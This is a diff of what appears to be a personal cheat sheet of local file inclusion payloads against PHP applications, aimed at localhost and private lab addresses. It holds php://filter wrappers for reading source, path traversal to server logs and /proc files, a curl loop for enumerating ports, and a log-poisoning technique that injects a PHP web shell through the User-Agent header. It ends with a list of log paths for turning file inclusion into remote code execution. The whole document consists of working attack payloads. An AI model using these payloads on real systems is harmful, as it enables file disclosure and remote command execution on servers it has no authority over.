@@ -1,13 +1,9 @@
 
-http://localhost/lfi.php?file=php://filter/convert.base64-encode/resource=EXAMPLE.php
+# WRAPPERS
+lfi.php?file=php://filter/convert.base64-encode/resource=EXAMPLE.php
 %00
 ?
 
-# LOG POISONING
-http://localhost/lfi.php?file=/var/log/auth.log
-http://localhost/lfi.php?file=/var/log/apache2/auth.log
-http://localhost/lfi.php?file=/var/log/apache2/access.log
-http://192.168.0.103/sea.php?file=../../../../../../var/log/auth
 
 curl --silent "http://192.168.0.109/lfi.php?file=/proc/sched_debug"
 view-source:http://192.168.0.109/lfi.php?file=/proc/net/fib_trie
@@ -16,3 +12,20 @@ for port in $(curl -s "http://192.168.0.109/lfi.php?file=/proc/net/tcp" | awk '{
 
 # SSH
 user-agent : <?php system($_GET['cmd']); ?>
+curl -s -H  "User-Agent: <?php system(\$_GET['cmd']); ?>" http://localhost/
+
+# LFI A RCE LOG POISONING
+/var/log/apache2/access.log	-> APACHE
+/var/log/auth.log			-> SSH
+/etc/vsftpd.conf			-> FTP (inclusiveness)
+/var/log/apache2/error.log
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail
+/proc/self/envoronment
+/proc/self/fd
+/var/log/apache2/auth.log
+/var/log/apache2/access.log
+/var/log/auth
+
+
